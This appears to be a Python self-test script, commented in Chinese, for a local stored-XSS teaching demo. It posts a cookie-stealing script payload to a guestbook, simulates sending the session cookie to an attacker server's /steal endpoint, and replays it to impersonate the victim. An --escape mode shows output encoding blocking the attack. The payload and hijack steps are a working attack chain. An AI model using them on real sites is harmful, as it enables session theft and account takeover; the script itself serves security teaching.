#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
攻击链自检 —— 不依赖浏览器，用脚本把整条 XSS 链路跑一遍。

用途:
  1. 演示前确认环境正常；
  2. 万一现场浏览器出问题，可以直接用它的输出代替现场演示。

用法:
    python selftest.py            # 验证漏洞模式(攻击成功)
    python selftest.py --escape   # 验证输出编码能否阻断
"""

import argparse
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

VICTIM = "http://127.0.0.1:8000"
ATTACKER = "http://127.0.0.1:8001"

PAYLOAD = ("<script>new Image().src='http://127.0.0.1:8001/steal?c='"
           "+encodeURIComponent(document.cookie)</script>")


def show(step, text):
    print(f"\n{'=' * 60}\n  步骤 {step}: {text}\n{'=' * 60}")


def get(url, cookie=None):
    req = urllib.request.Request(url)
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--escape", action="store_true",
                        help="提示词: 对应 --escape 模式启动的服务端")
    args = parser.parse_args()

    show(1, "受害者打开留言板，服务端下发会话 Cookie")
    req = urllib.request.Request(f"{VICTIM}/")
    with urllib.request.urlopen(req, timeout=5) as resp:
        set_cookie = resp.headers.get("Set-Cookie", "")
        html = resp.read().decode("utf-8", "replace")
    match = re.search(r"SESSID=([0-9a-f]+)", set_cookie)
    print(f"  Set-Cookie : {set_cookie}")
    if not match:
        print("  [!] 没能拿到会话 Cookie，请确认服务端已启动。")
        return 1
    sess = f"SESSID={match.group(1)}"
    print(f"  攻击者想拿到的东西就在这个 Cookie 里: {sess}")

    show(2, "受害者提交一条含脚本的留言")
    data = urllib.parse.urlencode({"text": PAYLOAD}).encode()
    post = urllib.request.Request(f"{VICTIM}/comment", data=data, method="POST")
    post.add_header("Cookie", sess)
    post.add_header("Content-Type", "application/x-www-form-urlencoded")
    urllib.request.urlopen(post, timeout=5).read()
    print(f"  已提交: {PAYLOAD}")

    show(3, "其他用户访问留言板，浏览器渲染服务端返回的 HTML")
    _, html = get(f"{VICTIM}/", cookie=sess)
    if "<script>new Image()" in html:
        print("  服务端把留言原样输出到了 HTML 里 —— 浏览器会把它当代码执行。")
        print(f"  页面中出现的片段:\n    {PAYLOAD[:80]}...")
        vulnerable = True
    elif "&lt;script&gt;" in html:
        print("  服务端做了输出编码，脚本变成了纯文本:")
        print("    &lt;script&gt;new Image()...&lt;/script&gt;")
        vulnerable = False
    else:
        print("  [!] 页面上没找到留言，请检查。")
        return 1

    show(4, "模拟浏览器执行那段脚本: 把 Cookie 发给攻击者服务器")
    steal_url = f"{ATTACKER}/steal?c=" + urllib.parse.quote(sess)
    status, _ = get(steal_url)
    print(f"  请求 {steal_url[:60]}...  => HTTP {status}")
    print("  (真实浏览器里这一步由脚本自动完成，用户毫无感知)")

    show(5, "攻击者查看战利品，并用偷来的凭证登录受害者系统")
    _, panel = get(f"{ATTACKER}/")
    if sess in panel:
        print(f"  攻击者面板上已经出现: {sess}")
    else:
        print("  攻击者面板上没有该凭证。")
    _, result = get(f"{ATTACKER}/impersonate?c=" + urllib.parse.quote(sess))
    if "登录成功" in result:
        who = re.search(r"当成了 (\w+)", result)
        print(f"  凭证复用结果: 登录成功，身份 = {who.group(1) if who else '?'}")
        print("  ==> 攻击者从来没有拿到密码，却完全接管了该账号。")
    else:
        print("  凭证复用失败(会话可能已过期)。")

    print(f"\n{'=' * 60}")
    if vulnerable:
        print("  结论: 攻击链完整走通 —— 这是漏洞模式应有的结果。")
    else:
        print("  结论: 输出编码生效，步骤 3 处脚本被降级为纯文本，")
        print("        浏览器不会执行它，随后步骤 4/5 都是脚本人为补做的。")
    print(f"{'=' * 60}\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
